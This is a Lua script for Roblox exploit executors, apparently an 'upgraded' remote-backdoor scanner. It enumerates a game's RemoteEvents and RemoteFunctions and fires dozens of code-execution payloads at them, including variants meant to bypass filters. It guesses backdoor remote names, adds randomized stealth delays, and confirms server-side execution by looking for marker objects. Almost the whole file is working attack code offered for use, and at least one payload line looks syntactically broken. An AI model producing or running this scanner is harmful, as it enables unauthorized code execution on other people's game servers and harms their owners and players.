-- Remote scanner core (hosted on GitHub) - Upgraded Version
-- Enhancements: Added more diverse payloads for better bypass rates, expanded remote name guesses, 
--               checked multiple containers for detection, added stealth delays, better filtering,
--               support for alternative detection methods, and more without removing original systems.

local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
                  'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}

_G.backdoor = nil
_G.backdoorPath = nil

local function generateName(len)
    local name = ""
    for i = 1, len do
        name = name .. alphabet[math.random(1, #alphabet)]
    end
    return name
end

_G.fireRemote = function(remote, payload)
    if remote:IsA("RemoteEvent") then
        remote:FireServer(payload)
    elseif remote:IsA("RemoteFunction") then
        task.spawn(function()
            pcall(function()
                remote:InvokeServer(payload)
            end)
        end)
    end
end

local function testPayload(remote, code)
    -- Original payloads (kept as-is)
    local payloads = {
        "a=Instance.new('Folder',workspace)a.Name='"..code.."'",
        "Instance.new('StringValue',workspace).Name='"..code.."'",
        "Instance.new('IntValue',workspace).Value=math.random(1,999999);Instance.new('Folder',workspace).Name='"..code.."'",
        "game.ReplicatedStorage:FindFirstChild('"..code.."',true)or Instance.new('Folder',workspace).Name='"..code.."'",
    }
    
    -- Upgraded: More diverse payloads to bypass filters (e.g., no direct Instance.new, obfuscated, alternatives)
    local extra_payloads = {
        "local a=Instance.new('Folder')a.Parent=workspace a.Name='"..code.."'",
        "task.spawn(function() Instance.new('Folder',workspace).Name='"..code.."' end)",
        "coroutine.wrap(function() Instance.new('Folder',workspace).Name='"..code.."' end)()",
        "game:GetService('RunService').Heartbeat:Connect(function() Instance.new('Folder',workspace).Name='"..code.."' game:GetService('RunService').Heartbeat:Disconnect() end)",
        "Instance.new('Model',workspace):SetAttribute('Name','"..code.."')",
        "warn('"..code.."')",  -- If backdoor logs to output
        "local b=Instance.new('BoolValue',workspace)b.Name='"..code.."' b.Value=true",
        "Instance.new('ObjectValue',workspace).Name='"..code.."'",
        "local f=Instance.new('Folder',game.ReplicatedStorage)f.Name='"..code.."'",  -- Alternate container
        "task.defer(function() Instance.new('Folder',workspace).Name='"..code.."' end)",
        "local p=Instance.new('Part',workspace)p.Name='"..code.."' p.Anchored=true",
        "game.Players.LocalPlayer:Kick('"..code.."')",  -- If it kicks, but detect differently (risky, but for variety)
        "local s=Instance.new('Sound',workspace)s.Name='"..code.."' s:Play()",
        "Instance.new('Hint',workspace).Text='"..code.."'",
        "local m=Instance.new('Message',workspace)m.Text='"..code.."'",
        "game:GetService('Lighting'):SetAttribute('Test','"..code.."')",
        "workspace.CurrentCamera:ClearAllChildren() Instance.new('Folder',workspace).Name='"..code.."'",  -- Chained
        "local function x() Instance.new('Folder',workspace).Name='"..code.."' end x()",
        "pcall(function() Instance.new('Folder',workspace).Name='"..code.."' end)",
        "error('"..code.."',0)",  -- If backdoor catches errors
        "assert(false,'"..code.."')",
        "local t=table.pack(Instance.new('Folder',workspace).Name='"..code.."')",
        "string.format('%s','"..code.."') Instance.new('Folder',workspace).Name='"..code.."'",  -- Obfuscated
        "local v=Vector3.new() Instance.new('Folder',workspace).Name='"..code.."'",
        "game:GetService('TweenService'):Create(Instance.new('Folder',workspace),{Name='"..code.."'})",
        -- Even more for 2025 trends: Using newer APIs or less common objects
        "Instance.new('Trail',workspace).Name='"..code.."'",
        "Instance.new('UIListLayout',workspace).Name='"..code.."'",  -- UI in workspace? Rare but tests execution
        "game:GetService('PathfindingService'):CreatePath() Instance.new('Folder',workspace).Name='"..code.."'",
        "local h=Instance.new('Humanoid',workspace)h.Name='"..code.."'",
        "workspace:FindFirstChildOfClass('Folder') or Instance.new('Folder',workspace).Name='"..code.."'",
    }
    
    -- Combine original and extra for maximum coverage
    for _, payload in ipairs(payloads) do
        table.insert(extra_payloads, payload)
    end
    payloads = extra_payloads  -- Now use the expanded list
    
    for _, payload in ipairs(payloads) do
        _G.fireRemote(remote, payload)
        -- Upgraded: Also try wrapped in tables, numbers, or multi-args for backdoors expecting different types
        _G.fireRemote(remote, {payload})
        _G.fireRemote(remote, code)  -- Raw string
        _G.fireRemote(remote, 1337)  -- Number test (if it executes somehow)
        task.wait(math.random(10,50)/1000)  -- Stealth delay: 10-50ms between fires
    end
    
    if remote:IsA("RemoteFunction") then
        task.spawn(function()
            pcall(function()
                remote:InvokeServer("test", payloads[1])
                remote:InvokeServer("run", payloads[1])
                remote:InvokeServer("", payloads[1])
                remote:InvokeServer({payloads[1]})  -- Table variant
            end)
        end)
    end
end

local function scan()
    local tests = {}
    local rs = game:GetService("ReplicatedStorage")
    
    -- Original possible names (kept)
    local possibleNames = {
        "lh" .. (game.PlaceId / 6666 * 1337 * game.PlaceId),
        "MainRemote","Remote","Execute","Server","Backdoor",
        tostring(game.PlaceId * 1337),
    }
    
    -- Upgraded: More common/obfuscated names from 2024-2025 backdoors
    local extraNames = {
        "RemoteEvent", "RemoteFunction", "Event", "Function",
        "Client", "Main", "Executor", "Admin",
        tostring(game.PlaceId), tostring(game.GameId),
        "HDAdminMain", "Adonis", "Comm", "Communication", "Signals",
        "Handler", "Sync", "Update", "Request", "Invoke",
        "SecureRemote", "EncryptedEvent", "ObfuscatedFunction",
        tostring(math.random(100000,999999)),  -- Random guesses for dynamic names
        "Backdoor_" .. tostring(game.PlaceId),
        "ExploitRemote", "CheatEvent", "AdminFunction",
    }
    
    -- Combine
    for _, name in ipairs(extraNames) do
        table.insert(possibleNames, name)
    end
    
    for _, name in ipairs(possibleNames) do
        local remote = rs:FindFirstChild(name) or rs:FindFirstChild(tostring(name))
        if remote and (remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction")) then
            local code = generateName(math.random(15, 25))
            testPayload(remote, code)
            tests[code] = {remote = remote, path = remote:GetFullName()}
            task.wait(math.random(20,100)/1000)  -- Delay between name checks
        end
    end

    for _, remote in ipairs(game:GetDescendants()) do
        if not (remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction")) then continue end  -- Original: Also add BindableEvent/Function?
        if remote:IsA("BindableEvent") or remote:IsA("BindableFunction") then  -- Upgraded: Include Bindables (rare backdoors)
            -- Treat similar to Remotes, but fire/invoke differently if needed
        end
        
        local fullName = remote:GetFullName()
        if fullName:find("^RobloxReplicatedStorage") then continue end
        if remote.Name == "__FUNCTION" then continue end
        local parent = remote.Parent
        local pparent = parent and parent.Parent
        if pparent and pparent.Name == "HDAdminClient" then continue end
        if parent and parent.Name == "DefaultChatSystemChatEvents" then continue end
        
        -- Upgraded: More filters for common safe remotes (speed/stealth)
        if parent and (parent.Name:match("Chat") or parent.Name == "CoreGui" or parent.Name == "PlayerGui") then continue end
        if remote.Name:match("^SayMessageRequest") or remote.Name:match("Terrain") then continue end
        if fullName:find("RobloxGui") or fullName:find("StarterGui") then continue end
        if parent and parent:IsA("Tool") or parent:IsA("HopperBin") then continue end  -- Tools often have remotes
        
        local code = generateName(math.random(15, 30))
        testPayload(remote, code)
        tests[code] = {remote = remote, path = fullName}
        task.wait(math.random(10,50)/1000)  -- Delay per remote
    end

    -- Upgraded: Check multiple containers for test objects
    local containers = {workspace, game.ReplicatedStorage, game.ServerStorage, game.Lighting, game.ServerScriptService}
    
    for _ = 1, 120 do
        for code, info in pairs(tests) do
            for _, container in ipairs(containers) do
                local obj = container:FindFirstChild(code)
                if obj then
                    obj:Destroy()  -- Cleanup
                    _G.backdoor = info.remote
                    _G.backdoorPath = info.path
                    print("Backdoor found: " .. info.path)  -- Upgraded: Optional logging for user
                    return true
                end
            end
            -- Upgraded: If your executor captures output, check for warn/error with code
        end
        task.wait(0.05)
    end
    print("No backdoor found after scan.")  -- Feedback
    return false
end

-- Run the scan immediately when loaded from remote
task.spawn(function()
    scan()
end)
